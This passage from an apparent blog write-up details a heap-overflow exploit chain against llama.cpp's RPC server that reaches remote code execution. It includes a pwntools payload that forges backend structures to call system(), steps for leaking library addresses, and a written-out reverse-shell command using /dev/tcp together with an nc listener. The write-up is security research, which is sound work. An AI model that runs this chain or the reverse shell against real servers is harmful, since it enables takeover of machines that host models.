<li><p><code>rdi</code> must be a <code>buffer</code> address that&#39;s included in the global <code>buffers</code> list (managed during <code>alloc_buffer</code> / <code>free_buffer</code>), we can&#39;t fake a <code>buffer</code> structure</p>
</li>
<li><p><code>buffers</code> is on somewhere we don&#39;t know, sadly you can&#39;t leak it</p>
</li>
<li><p>although we can control <code>buffer-&gt;iface</code>&#39;s pointers, however, we must leave <code>buffer-&gt;iface-&gt;free_buffer</code> as <code>nullpt</code> / valid address to avoid crashes during the <code>backend_buffer_free</code> right after the overflow, we can&#39;t point <code>buffer-&gt;iface-&gt;free_buffer</code> to a data address that&#39;s not executable. <em>(This implicitly stands for the limitation we mentioned when parsing</em> <code>buffer</code> as a argument, it means <code>buffer-&gt;iface-&gt;free_buffer</code> (the very first member of the <code>buffer</code> structure))</p>
</li>
</ul>
<p>Therefore, for us to successful achieve RCE in such context with limitation, we will have to find a way that <code>RPC</code> somehow successfully interpreted the called method as a <code>buffer</code> based address, while another <code>buffer</code> based address as a argument, and neither of this can be <code>buffer</code>, since the first element is not-mess-around-able. And the best way for to do such, is via <strong>Structure-Oriented Programming</strong>. And the final payload we got is seemly fascinating.</p>
<h2 id="heading-structure-oriented-programming-world-of-offsets-four-layers-call-chain-perspectives">Structure-Oriented Programming: World-of-Offsets, Four layers call-chain, Perspectives</h2>
<p>To begin with, we must all heard of the operator, <code>&#39;-&gt;&#39;</code> in whether <code>cpp</code> / <code>c</code> <em>(not sure if this is a only</em> <code>c</code> thing), if not, I wonder how it&#39;s possible for you that to read till here *(or you probably just jump to this section);</p>
<p>At the begin, I always through this is a member indicator to access class members, use such commonly in our OOP world. However, at a certain point in your life some special someone <em>(I hope this special someone is not me)</em> will tell you that: <strong>All member indicators are, eventually, just offset.</strong> When you will finally start to understand the truth of life and binary-exploitations, and unlock one of the best thing in binary-exploitation (except <code>gdbing</code>) - messing with structures, with that being said, <strong>Structure-Oriented Programming</strong>.</p>
<p>Despite the fact that our argument are asked to be a <code>buffer</code> structure, which seemly impossible to exploit, but no-one says it must be interpreted as a <code>buffer</code> structure, and that&#39;s the key for us to construct the final-step - Remote-Code Executions. Even though we do-not have that much of control over <code>buffer</code>, we can try to interpret it to something else by the call-wrappers and result in unexpected results.</p>
<h3 id="heading-ggmlbackendt-ampamp-ggmlbackenddevt"><code>ggml_backend_t</code> &amp;&amp; <code>ggml_backend_dev_t</code>:</h3>
<p><code>ggml_backend_t</code>, <code>ggml_backend_dev_t</code> is two structure we haven&#39;t mentioned at all before, in fact, <code>ggml_backend_dev_t</code> is included in the <code>ggml_backend_t</code> structure as <code>ggml_backend-&gt;type</code></p>
<pre><code>    <span><span>struct</span> <span>ggml_backend</span> {</span>
        <span>ggml_guid_t</span> guid;
        <span><span>struct</span> <span>ggml_backend_i</span> <span>iface</span>;</span>
        <span>ggml_backend_dev_t</span> device;
        <span>void</span> * context;
    };

    <span><span>struct</span> <span>ggml_backend_device</span> {</span>
        <span><span>struct</span> <span>ggml_backend_device_i</span> <span>iface</span>;</span>
        <span>ggml_backend_reg_t</span> reg;
        <span>void</span> * context;
    };
</code></pre>
<blockquote>
<p>A GGML backend is an abstraction layer that provides a unified interface for executing machine learning computations across different hardware devices (like CPU, GPU, or other accelerators). It handles all device-specific operations including memory management (allocation, transfers, and synchronization), computation execution (both synchronous and asynchronous), tensor operations, and event handling for synchronization between operations. Each backend implementation (such as CUDA, Metal, or Vulkan) follows a standard interface while providing device-specific optimizations, allowing the GGML framework to seamlessly work with different hardware while maintaining a consistent API, with automatic fallback to CPU if specialized hardware is unavailable.</p>
</blockquote>
<p>For every <code>ggml_backend</code> thread, there a <code>ggml_backend</code> that manages this thread. Both the <code>ggml_backend</code> and <code>ggml_backend_device</code> have a <code>iface</code> table, similar to our <code>buffer</code> structure <em>(I didn&#39;t put it out since it would take up too much space)</em>. We don&#39;t particularly need to know that detailed regarding how <code>ggml_backend</code> / <code>ggml_backend_device</code> works as how we <code>buffer</code>, but it&#39;s essential for us to understand it&#39;s basic structure, which will be very essential.</p>
<p>You might wonder why we are mentioning it now; we never referenced this or saw this structure anywhere in this write-up. The reason why we bought this up is connected with our Structure-Oriented Programming journey.</p>
<h3 id="heading-perspectives-and-interpretations">Perspectives, and interpretations</h3>
<p>During the process of researching on usable <code>call-wrapper</code> regarding the limitations of our <code>rdi</code> being <code>buffer</code> structure constrained, nothing helpful was found at all, despite the entire <code>ggml_backend.c</code> / <code>ggml_backend.h</code> being reviewed. <em>(Pretty much all call-wrapper are useless whether it directly passed in a meaningless argument to a controllable</em> <code>buffer-&gt;iface</code> pointer after internal logics, or the specified <code>buffer</code> offset is not controllable) This is very sad, however, as further the research goes, an interesting method that gave us a little hope of success pop out;</p>
<pre><code><span><span>size_t</span> <span>ggml_backend_get_alignment</span><span>(<span>ggml_backend_t</span> backend)</span> </span>{
    <span>return</span> ggml_backend_buft_get_alignment(ggml_backend_get_default_buffer_type(backend));
}
</code></pre>
<p>Here, the <code>ggml_backend_get_alignment</code> is what we are talking about, now you might understand why I introduced the <code>backend</code> structure to you. However, it&#39;s still not certain since it only looks like a nested two call-wapper wrapper, taking a <code>ni</code> into the methods; Here this wrapper have three parts that we might be interested in: <code>ggml_backend_buft_get_alignment</code>,<code>ggml_backend_get_default_buffer_type</code>, and a internal <code>ggml_backend_get_default_buffer_type</code> method; For now, let&#39;s focus on the <code>ggml_backend_get_default_buffer_type</code> related implementations.</p>
<pre><code><span><span>ggml_backend_buffer_type_t</span> <span>ggml_backend_get_default_buffer_type</span><span>(<span>ggml_backend_t</span> backend)</span> </span>{
    <span>return</span> ggml_backend_dev_buffer_type(backend-&gt;device);
}
<span><span>ggml_backend_buffer_type_t</span> <span>ggml_backend_dev_buffer_type</span><span>(<span>ggml_backend_dev_t</span> device)</span> </span>{
    <span>return</span> device-&gt;iface.get_buffer_type(device);
}
</code></pre>
<p>These is the most essential two lines of implementation in our structure-oriented programming section, the <code>ggml_backend_get_alignment</code> calls <code>ggml_backend_get_default_buffer_type</code> as the parameter for <code>ggml_backend_buft_get_alignment</code>, while passing the parameter <code>backend</code> into the parameter callee <code>ggml_backend_get_default_buffer_type</code>; And inside of <code>ggml_backend_get_default_buffer_type</code>, <code>ggml_backend_dev_buffer_type</code> is called as return value, with the passed <code>backend-&gt;device</code> as an argument, while <code>ggml_backend_dev_buffer_type</code> calls the <code>device-&gt;iface.get_buffer_type(device)</code> with the argument.</p>
<p>This sounds really confusing, but it will be much less complex reading the original call chain, and if I list all the final calls, and parameters for it, here is how it goes:</p>
<ol>
<li><p>Called <code>ggml_backend_get_alignment</code>:</p>
<ol>
<li><p>Calls <code>ggml_backend_buft_get_alignment</code>; Argument: <code>ggml_backend_get_default_buffer_type(backend)</code> <em>(Here we are ignoring this part)</em></p>
</li>
<li><p>Calls <code>ggml_backend_get_default_buffer_type</code>; Argument: <code>backend</code></p>
<ol>
<li><p>Calls <code>ggml_backend_dev_buffer_type</code>, Argument: <code>backend-&gt;device</code></p>
<ol>
<li>Calls <code>device-&gt;iface.get_buffer_type</code> (<code>backend-&gt;device-&gt;iface.get_buffer_type</code>), Argument: <code>device</code> (<code>backend-&gt;device</code>)</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>How interesting is that, <strong>This is a 4-layer nested call-chain</strong>, the <code>backend</code> parameter at the beginning is passed all the way down into the final method call <code>backend-&gt;device-&gt;iface.get_buffer_type</code>, while it&#39;s parameter is also a a backend member <em>(</em><code>device</code> (<code>backend-&gt;device</code>))!</p>
<p>Recall our introduction to the <code>backend</code> structure, the first member is <code>ggml_guid_t guid</code>, <code>typedef uint8_t ggml_guid[16]</code> - 16 sized <code>uint8_t</code>, this member is not called in the nested call-chain thus avoids us from messing with the partially-incontrollable <code>buffer-&gt;iface-&gt;free_buffer</code> pointer. The only manipulated member required is the <code>buffer-&gt;device</code> structure, luckily, at the meantime, the manipulation required pointer <code>buffer-&gt;device-&gt;iface-&gt;get_buffer_type</code> happens to be the 7th member of the <code>device</code> structure, this means possible data manipulation on <code>buffer-&gt;device</code> (first member of <code>buffer-&gt;device</code>) will not conflicts with out exploitation.</p>
<p>What this means is that, if the <code>buffer</code> structure with a is forged a with a <code>backend</code> structure with a validly-forged <code>device</code> included structure <em>(Importantly a proper forged</em> <code>device-&gt;iface</code> structure) **we are able to call a manipulable pointer with a manipulated parameter.*; Where we call the <code>buffer-&gt;device-&gt;iface-&gt;get_buffer_type</code>, parameter as `buffer-&gt;device.</p>
<p>This requires a little bit of calculation of forging <code>backend</code>&#39;s arrangement base on the original <code>buffer</code> (<em>this will still be based on overflowing</em> <code>buffer</code> from <code>buffer-&gt;context</code>, thus not corrupting chunk header is still important). This can be easily achieved by observing the <code>backend</code> structure or payload-ing <code>pwntools</code>&#39;s <code>cyclic()</code> to observe the structural arrange with <code>gdb</code>&#39;s <code>p/x* (ggml_backend) address</code>:</p>
<pre><code>    payload = flat({               
        <span>0</span>:[
            p64(<span>0xdeadbeef</span>),
            cmd,
        ],
        <span>0x616161706161616f</span>: [p64(system)],
        <span>248</span>:[
            fake_ggml_backend_buffer_table(
                free_buffer     = <span>0</span>,
                get_base        = ggml_base + ggml_backend_get_alignment,
                init_tensor     = <span>0xdeadbeef</span>,
                memset_tensor   = <span>0xdeadbeef</span>,
                set_tensor      = <span>0xdeadbeef</span>,
                get_tensor      = <span>0xdeadbeef</span>,
                cpy_tensor      = <span>0xdeadbeef</span>,
                clear           = <span>0xdeadbeef</span>,
                reset           = <span>0xdeadbeef</span>,
                buft            = <span>0xdeadbeef</span>,
                context         = <span>0xdeadbeef</span>,
                size            = <span>0x110</span>,
                usage           = <span>0</span>,
            ),
            p64(<span>0x111</span>),
            p64(manipulated_buffer_base_3+<span>0x10</span>),
        ]
    })
</code></pre>
<p>Converting the theoretical exploitation into reality needs an <strong>extra bit of consideration and tricks</strong>; To begin with, we do not replace the original <code>buffer</code> structure yet, since we still depends on the <code>buffer-&gt;iface</code> pointer manipulations to redirect the execution-flow. <em>(At the meantime)</em>. <strong>A trick in the exploitation here is we forge the</strong> <code>backend-&gt;device</code> structure in the <code>buffer-&gt;context</code> <em>(or you might call it base)</em>, and forging the <code>backend-&gt;device</code> pointer in the <code>backend</code> structure based on <code>buffer</code>. This in on hand enabled more rooms for us, on the other hand necessary as the <code>backend-&gt;device</code> will be dereferenced as a pointer. On the base of this, we set the begin of <code>buffer-&gt;context</code>, or the <code>backend-&gt;device</code> during re-interpretation, as the parameter stored at the deference address of <code>backend-&gt;device</code>, we then plants <code>buffer-&gt;device-&gt;iface-&gt;get_buffer_type</code> on it&#39;s offsets to the device structure, as this time to the <code>buffer-&gt;context</code> <em>(in other ways, it will be</em> <code>(ggml_backend_buffer) buffer-&gt;context (ggml_backend) -&gt;iface-&gt;get_buffer_type</code>):</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726843376/4e27947a-a5a9-4afd-8e0c-60b70d73fa0f.png" alt=""/></p>
<p>This is what the memory layout should looks like, <code>buffer</code> based <em>(Even though it says</em> <code>backend</code>, it&#39;s because this breakpoint is set on <code>ggml_backend_get_alignment</code> after the controll-flow hijack) that&#39;s being passed into using the same methodology from the hijacked <code>get_base</code>, this is all about leaving the original structure while allowing re-interpretations and messing with pointers and offsets. Here we manipulated <code>backend-&gt;device-&gt;iface-&gt;get_buffer_type</code> to <code>system()</code>, with the leaked <code>libc.so.6</code> address we got from leaking the <code>libggml-base.so</code> from partial writing, and manipulated <code>backend-&gt;device</code> pointer pointing to the <code>context</code> address where we wrote the specific argument for the manipulated, in this case, the command that we want to <code>system()</code> execute.</p>
<p>After finishing all these and heap arrangement / related-operations in <code>exp.py</code>, as the moment this <code>buffer</code>&#39;s <code>get_base</code> is re-called, here, the final objective, remote specified code, will be executed in the <code>RPC</code> Server.</p>
<blockquote>
<p><em>Looking back into the exploitation process, with all the Paradox-of-Overflow, Paradox-of-Partial-Writing, and the structural constraints we encountered, we were still able to achieve aRemote Code Execution by leveraging techniques. Despite the stringent memory checks, custom heap management, and multiple mitigations implemented in Llama.cpp, we navigated through these challenges with careful analysis and creative problem-solving! From identifying the heap-overflow vector hidden in</em> <code>ggml_backend_cpu_buffer_cpy_tensor</code> to exploiting the NullPointerNoException and finally deploying Structure-Oriented Programming, each step required a little bit of patience (as well as luck lol) and learnt a little bit, I am glad to made it here, and what a magical exploitation it is!</p>
</blockquote>

<p>Here is final version of the <code>exp.py</code> <em>(Since it takes up too much space, I decided not to put it here, it will be at</em> <a target="_blank" href="https://gist.github.com/retr0reg/d13de3fde8f9d138fe1af48e59e630a9">gist</a>), eventual you will have to covert these exploitation-al ideas to a realistic interaction with <code>llama.cpp</code>&#39;s interaction. I will explain how each exploitation-al step is implemented. (Notice that the implementation of <code>RPC</code> Communication Protocols is deleted, I don&#39;t want spend space and time explain <code>llama.cpp</code> &#39;s <code>RPC Protocols</code>, you should be able to figure that out yourself)</p>
<ol>
<li><p>To begin with, before starting any exploitation-al process, we firstly allocates required <code>buffer</code> using the <code>alloc_buffer</code>, then retrieving each&#39;s <code>buffer-&gt;context</code> using the <code>get_base</code> <code>buffer-&gt;iface</code> method. Notice here how we arrange the size for each chunks to maximum the size of input (overflow payload). <code>written_buffer</code> is for the <code>src</code> of <code>cpy_tensor</code> operations, <code>manipulated_buffer</code> being the <code>cpy_tensor</code>&#39;s <code>dst</code> of overflow. We are required to overflow 3 times during the exploitation (first time leaking <code>libggml-base.so</code>, second time leaking <code>libc.so.6</code> via mitigation bypass, last time overflowing to forge <code>backend</code> structures to use the call-wrappers). There&#39;s still parts of unreason behavior going on on the heap arrangement that we cannot explain of, for example, we must allocate three padding <code>buffer</code> after <code>manipulated_buffer_2</code> or <code>written_buffer_3</code> will be adjacent to two freed buffers despite we allocate new ones after, this will result us to not-able-to <code>set_tensor</code> the <code>written_buffer_3</code> for further exploitation, while we need to allocate a <code>buffer_list</code> thats from a deprecated previous failed exploitation, if I remove it arrangement just gone wrong <em>(This is weird and not yet explainable)</em></p>
</li>
<li><p>Then we partial-write the lowest two-bytes of the <code>buffer-&gt;iface-&gt;free_buffer</code> pointer to <code>ggml_backend_buffer_get_type</code> to leak <code>libggml-base.so</code> by leaking out the <code>buffer-&gt;buft</code> address that is located on the <code>libggml-base.so</code> <code>vmmap</code> address. Notice here how we manually construct the <code>src</code> tensor as partial-writing&#39;s special <code>ne[] / nb[]</code> calculations that we need to pay attentions to. We firstly set the payload to the <code>written_buffer_base</code> buffer, then call <code>cpy_tensor</code> to overflow the <code>dst</code> tensor with <code>src</code> tensor, this is also why we applied for a small size for the <code>manipulated_buffer_base</code>.</p>
<ul>
<li><code>pwntools</code> native <code>io.recvn(0x18)</code> is used to receive a certain size of <code>socket</code> response, in this case, we will still have to align / bits-tranforms the received <code>libggml-base.so</code>:<code>ggml_backend_cpu_buffer_type</code> pointer. Furthermore, with the received <code>libc.so.6</code> pointer, we can calculate the reminding <code>buffer-&gt;iface</code> components&#39;s <code>DLL</code> address.</li>
</ul>
</li>
<li><p>With the calculated <code>ggml_base</code> address based on partial-writing techniques, we are able to forge the <code>fake_ggml_backend_buffer_table</code> breaking the <em>paradox-of-overflow</em>, we are faking <code>buffer-&gt;context</code> address to bypass past <code>p0/p1</code> mitigations on <code>get_tensor</code> boundary. We are leaking <code>ggml.got[&#39;memcpy&#39;]</code> to leak the <code>GOT</code> addresses and <code>libc.so.6</code> address. After the partial-writing exploitation, we doesn&#39;t need to aim for a specific <code>nbytes</code> size. However, we must make sure that <code>nbytes</code> will not be too big or it might unexpectedly overflow proceeding chunks.</p>
</li>
<li><p>With known <code>libggml-base.so</code> and <code>libc.so.6</code> address, we finally forge a <code>backend</code> <code>buffer</code> structure, that. is both interpretable as a <code>buffer</code> structure when manipulating the control flow to the <code>buffer-&gt;iface-&gt;get_base</code> call, while can be interpreted as <code>backend</code> structure; When we are calling for the <code>ggml_backend_get_alignment</code> call wrapper for the 3-layer-call-chain. Creating a structure of <code>buffer-&gt;iface-&gt;get_base = ggml_backend_get_alignment</code>, <code>backend-&gt;device = buffer-&gt;context</code>, <code>backend-&gt;device-&gt;iface-&gt;get_buffer_type = system()</code>, write the first-parameter of <code>jmp-ed</code> <code>system()</code> in <code>backend-&gt;device</code></p>
<ol>
<li><code>ggml_backend_get_default_buffer_type(backend)</code> will trigger <code>backend-&gt;device-&gt;iface-&gt;get_buffer_type</code> with parameter <code>backend-&gt;device</code>, in this case <code>buffer-&gt;context-&gt;iface-&gt;get_buffer_type (system)</code> with parameter <code>backend-&gt;device (the argument)</code>. In the exploitation we set up a reverse-shell command <code>sh -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1\x00</code>, creating a reverse-shell connection via <code>sh</code> on <code>127.0.0.1:1337</code></li>
</ol>
</li>
<li><p>Listen on <code>127.0.0.1:1337</code> with <code>nc -lvp 1337</code>, a reverse-shell connection will be received after the execution of the payload.</p>
</li>
</ol>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726879328/8a495a19-48ab-4d20-82f3-637e392b9c1e.png" alt=""/></p>
</div></div>
  </body>
</html>
